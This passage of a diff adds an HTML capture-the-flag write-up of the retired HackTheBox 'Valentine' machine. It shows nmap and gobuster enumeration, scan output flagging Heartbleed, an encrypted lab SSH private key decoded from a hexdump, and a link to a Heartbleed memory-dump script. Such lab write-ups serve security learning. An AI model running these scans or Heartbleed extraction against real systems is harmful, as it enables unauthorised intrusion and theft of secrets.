@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Valentine</strong></h1>
+        <em>Released: February 17th 2018 / Pwned: October 24th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Valentine is all about the heartbleed vulnerability.<br>
+        You find a password protected SSH key on the website, and with heartbleed extract the base64 encoded passphrase from memory to go with it. Once on the machine, you find a tmux session running as root, and the commands in the user's <code>.bash_history</code> on how to connect.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.79</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p 22,80,443 -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.79</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>valentine#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>valentine#&nbsp;nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-allports.txt&nbsp;10.10.10.79<br>
+                [..]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span><br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;http<br>
+                443<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;https<br>
+                <br>
+                Nmap&nbsp;done<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1&nbsp;IP&nbsp;address&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>1&nbsp;host&nbsp;up<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;39.02&nbsp;seconds<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>valentine#&nbsp;nmap&nbsp;-p&nbsp;22,80,443&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-openports.txt&nbsp;10.10.10.79<br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;VERSION<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;5.9p1&nbsp;Debian&nbsp;5ubuntu1.10&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;Linux<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;protocol&nbsp;2.0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssh-hostkey<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;1024&nbsp;96<span style="color:#ff9d00;font-weight:700">:</span>4c<span style="color:#ff9d00;font-weight:700">:</span>51<span style="color:#ff9d00;font-weight:700">:</span>42<span style="color:#ff9d00;font-weight:700">:</span>3c<span style="color:#ff9d00;font-weight:700">:</span>ba<span style="color:#ff9d00;font-weight:700">:</span>22<span style="color:#ff9d00;font-weight:700">:</span>49<span style="color:#ff9d00;font-weight:700">:</span>20<span style="color:#ff9d00;font-weight:700">:</span>4d<span style="color:#ff9d00;font-weight:700">:</span>3e<span style="color:#ff9d00;font-weight:700">:</span>ec<span style="color:#ff9d00;font-weight:700">:</span>90<span style="color:#ff9d00;font-weight:700">:cc:</span>fd<span style="color:#ff9d00;font-weight:700">:</span>0e&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>DSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;2048&nbsp;46<span style="color:#ff9d00;font-weight:700">:</span>bf<span style="color:#ff9d00;font-weight:700">:</span>1f<span style="color:#ff9d00;font-weight:700">:cc:</span>92<span style="color:#ff9d00;font-weight:700">:</span>4f<span style="color:#ff9d00;font-weight:700">:</span>1d<span style="color:#ff9d00;font-weight:700">:</span>a0<span style="color:#ff9d00;font-weight:700">:</span>42<span style="color:#ff9d00;font-weight:700">:</span>b3<span style="color:#ff9d00;font-weight:700">:</span>d2<span style="color:#ff9d00;font-weight:700">:</span>16<span style="color:#ff9d00;font-weight:700">:</span>a8<span style="color:#ff9d00;font-weight:700">:</span>58<span style="color:#ff9d00;font-weight:700">:</span>31<span style="color:#ff9d00;font-weight:700">:</span>33&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;256&nbsp;e6<span style="color:#ff9d00;font-weight:700">:</span>2b<span style="color:#ff9d00;font-weight:700">:</span>25<span style="color:#ff9d00;font-weight:700">:</span>19<span style="color:#ff9d00;font-weight:700">:</span>cb<span style="color:#ff9d00;font-weight:700">:</span>7e<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>cb<span style="color:#ff9d00;font-weight:700">:</span>0a<span style="color:#ff9d00;font-weight:700">:</span>b9<span style="color:#ff9d00;font-weight:700">:</span>ac<span style="color:#ff9d00;font-weight:700">:</span>16<span style="color:#ff9d00;font-weight:700">:</span>98<span style="color:#ff9d00;font-weight:700">:</span>c6<span style="color:#ff9d00;font-weight:700">:</span>7d<span style="color:#ff9d00;font-weight:700">:</span>a9&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ECDSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.2.22&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.2.22&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Site&nbsp;doesnt&nbsp;have&nbsp;a&nbsp;title&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>text<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+                443<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;ssl<span style="color:#ff9d00;font-weight:700">/</span>http&nbsp;Apache&nbsp;httpd&nbsp;2.2.22&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.2.22&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Site&nbsp;doesnt&nbsp;have&nbsp;a&nbsp;title&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>text<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssl-cert<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Subject<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;commonName=valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>organizationName=valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>stateOrProvinceName=FL<span style="color:#ff9d00;font-weight:700">/</span>countryName=US<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Not&nbsp;valid&nbsp;before<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2018-02-06T00<span style="color:#ff9d00;font-weight:700">:</span>45<span style="color:#ff9d00;font-weight:700">:</span>25<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_Not&nbsp;valid&nbsp;after<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;2019-02-06T00<span style="color:#ff9d00;font-weight:700">:</span>45<span style="color:#ff9d00;font-weight:700">:</span>25<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_ssl-date<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2019-10-22T13<span style="color:#ff9d00;font-weight:700">:</span>59<span style="color:#ff9d00;font-weight:700">:</span>12+00<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;-1s&nbsp;from&nbsp;scanner&nbsp;time.<br>
+                <br>
+                [..]
+            </div>
+        </div><br>
+        <br>
+        Analysis:<br>
+        • 22/ssh - Nothing to do here, but OpenSSH 5.9p1 is an old version. Take a mental note.<br>
+        • 80/http and 443/http - Websites! But the Apache is server is also old.<br>
+        <br>
+        Considering this box is running old services, try running nmap's vuln scripts against the box to check for vulnerabilities.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>valentine]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;22,80,443&nbsp;-T4&nbsp;-sV&nbsp;--script&nbsp;vuln&nbsp;10.10.10.79</span><br>
+                Starting&nbsp;Nmap&nbsp;7.80&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-10-23&nbsp;23<span style="color:#ff9d00;font-weight:700">:</span>51&nbsp;BST<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;VERSION<br>
+                [...]<br>
+                443<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;ssl<span style="color:#ff9d00;font-weight:700">/</span>http&nbsp;Apache&nbsp;httpd&nbsp;2.2.22&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                [...]<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssl-heartbleed<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;VULNERABLE<span style="color:#ff9d00;font-weight:700">:</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;The&nbsp;Heartbleed&nbsp;Bug&nbsp;is&nbsp;a&nbsp;serious&nbsp;vulnerability&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;the&nbsp;popular&nbsp;OpenSSL&nbsp;cryptographic&nbsp;software&nbsp;library.&nbsp;It&nbsp;allows&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">stealing</span>&nbsp;information&nbsp;intended&nbsp;to&nbsp;be&nbsp;protected&nbsp;by&nbsp;SSL/TLS&nbsp;encryption.<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;State:&nbsp;VULNERABLE<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Risk&nbsp;factor:&nbsp;High<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSL&nbsp;versions&nbsp;1.0.1&nbsp;and&nbsp;1.0.2-beta&nbsp;releases&nbsp;(including&nbsp;1.0.1f&nbsp;and&nbsp;1.0.2-beta1)&nbsp;of&nbsp;OpenSSL&nbsp;are&nbsp;affected&nbsp;by&nbsp;the&nbsp;Heartbleed&nbsp;bug.&nbsp;The&nbsp;bug&nbsp;allows&nbsp;for&nbsp;reading&nbsp;memory&nbsp;of&nbsp;systems&nbsp;protected&nbsp;by&nbsp;the&nbsp;vulnerable&nbsp;OpenSSL&nbsp;versions&nbsp;and&nbsp;could&nbsp;allow&nbsp;for&nbsp;disclosure&nbsp;of&nbsp;otherwise&nbsp;encrypted&nbsp;confidential&nbsp;information&nbsp;as&nbsp;well&nbsp;as&nbsp;the&nbsp;encryption&nbsp;keys&nbsp;themselves.<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;References:<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://www.openssl.org/news/secadv_20140407.txt&nbsp;<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://cvedetails.com/cve/2014-0160/<br>
+                [..]
+            </div>
+        </div><br>
+        <br>
+        There's a large output, but the interesting result is that 443/https is vulnerable to heartbleed.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http - /dev</strong></h2><br>
+        First, check out the website.<br>
+        <code>gobuster</code> finds 3 interesting directories - <code>/dev</code>, <code>/encode.php</code>, and <code>/decode.php</code>.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>valentine<span style="color:#ff9d00;font-weight:700">/</span>80#&nbsp;gobuster&nbsp;<span style="color:#ff9d00;font-weight:700">dir</span>&nbsp;-e&nbsp;-u&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb&nbsp;-w&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>big.txt&nbsp;-x&nbsp;.php,.txt&nbsp;-s&nbsp;200,204,301,302,307,401,403,500&nbsp;-o&nbsp;gb-big.txt<br>
+                ===============================================================<br>
+                Gobuster&nbsp;v3.0.1<br>
+                by&nbsp;OJ&nbsp;Reeves&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@TheColonial<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;</span>&nbsp;Christian&nbsp;Mehlmauer&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@_FireFart_<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ===============================================================<br>
+                [+]&nbsp;Url<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<br>
+                [+]&nbsp;Threads<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10<br>
+                [+]&nbsp;Wordlist<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>big.txt<br>
+                [+]&nbsp;Status&nbsp;codes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;200,204,301,302,307,401,403,500<br>
+                [+]&nbsp;User&nbsp;Agent<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gobuster<span style="color:#ff9d00;font-weight:700">/</span>3.0.1<br>
+                [+]&nbsp;Extensions<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;php,txt<br>
+                [+]&nbsp;Expanded<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">true</span><br>
+                [+]&nbsp;Timeout<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10s<br>
+                ===============================================================<br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>.htaccess&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>.htaccess.txt&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>.htaccess.php&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>.htpasswd&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>.htpasswd.php&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>.htpasswd.txt&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>cgi-bin<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>decode&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>decode.php&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>dev&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;301<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>encode&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>encode.php&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>index&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>index.php&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>valentine.htb<span style="color:#ff9d00;font-weight:700">/</span>server-status&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>2a) /dev/hype_key</strong></h3><br>
+        <code>/dev</code> contains <code>hype_key</code>, which is a hexdump of ASCII characters.<br>
+        Use <code>xxd</code> to convert the hex values into ASCII, and you have a passphrase protected SSH key.<br>
+            <div class="codebox">
+                ┌─[horace@parrot]─[~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>valentine]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#xxd&nbsp;-r&nbsp;-p&nbsp;hype_key.hex&nbsp;</span><br>
+                -----BEGIN&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
+                Proc-Type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;4,ENCRYPTED<br>
+                DEK-Info<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46<br>
+                <br>
+                DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R<br>
+                5y<span style="color:#ff9d00;font-weight:700">/</span>b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1<span style="color:#ff9d00;font-weight:700">/</span>gjB<span style="color:#ff9d00;font-weight:700">/</span>7<span style="color:#ff9d00;font-weight:700">/</span>My00Mwx+aI6<br>
+                0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi<br>
+                Ebw66hjFmAu4AzqcM<span style="color:#ff9d00;font-weight:700">/</span>kigNRFPYuNiXrXs1w<span style="color:#ff9d00;font-weight:700">/</span>deLCqCJ+Ea1T8zlas6fcmhM8A+8P<br>
+                OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd<br>
+                pHLJpYUII5PuO6x+LS8n1r<span style="color:#ff9d00;font-weight:700">/</span>GWMqSOEimNRD1j<span style="color:#ff9d00;font-weight:700">/</span>59<span style="color:#ff9d00;font-weight:700">/</span>4u3ROrTCKeo9DsTRqs2k1SH<br>
+                QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E<br>
+                p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC<br>
+                Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO<br>
+                t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5<br>
+                XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK<br>
+                aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ<br>
+                +wQ87lMadds1GQNeGsKSf8R<span style="color:#ff9d00;font-weight:700">/</span>rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E<br>
+                AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q<br>
+                r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89<span style="color:#ff9d00;font-weight:700">/</span>RZ5oSQe<br>
+                2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky<br>
+                e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc<span style="color:#ff9d00;font-weight:700">/</span>LVjmbhZzKwLhaZRNd8HEM86fNojP<br>
+                09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC<br>
+                dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK<span style="color:#ff9d00;font-weight:700">/</span>iaL3X1R3DxV8eSYFKFL6pqpuX<br>
+                cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk<span style="color:#ff9d00;font-weight:700">/</span>9fyX6op24rL2DyESpY<br>
+                pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj<br>
+                Mslf+9xK+TXEL3icmIOBRdPyw6e<span style="color:#ff9d00;font-weight:700">/</span>JlQlVRlmShFpI8eb<span style="color:#ff9d00;font-weight:700">/</span>8VsTyJSe+b853zuV2qL<br>
+                suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC<span style="color:#ff9d00;font-weight:700">/</span>wUyUXlMJ50Nw6JNVMM8LeCii3OEW<br>
+                l0ln9L1b<span style="color:#ff9d00;font-weight:700">/</span>NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW<span style="color:#ff9d00;font-weight:700">/</span>IzT<br>
+                RUgZkbMQZNIIfzj1QuilRVBm<span style="color:#ff9d00;font-weight:700">/</span>F76Y<span style="color:#ff9d00;font-weight:700">/</span>YMrmnM9k<span style="color:#ff9d00;font-weight:700">/</span>1xSGIskwCUQ+95CGHJE8MkhD3<br>
+                -----END&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Heartbleed</strong></h2><br>
+        The heartbleed bug allows us to extract the current contents of memory from the server.<br>
+        Github provides a comprehensive script to do this :) Thanks eelsivart.<br>
+        <a href="https://gist.github.com/eelsivart/10174134">https://gist.github.com/eelsivart/10174134</a><br>
+        <br>
+        <code>-n 5</code> to loop and retrieve from 5 times.<br>
+        <code>-r</code> to print out the memory contents.<br>
+        <code>-a</code> to print out the memory contents as ASCII<br>
+        <br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>valentine<span style="color:#ff9d00;font-weight:700">/</span>heartbleed]<br>
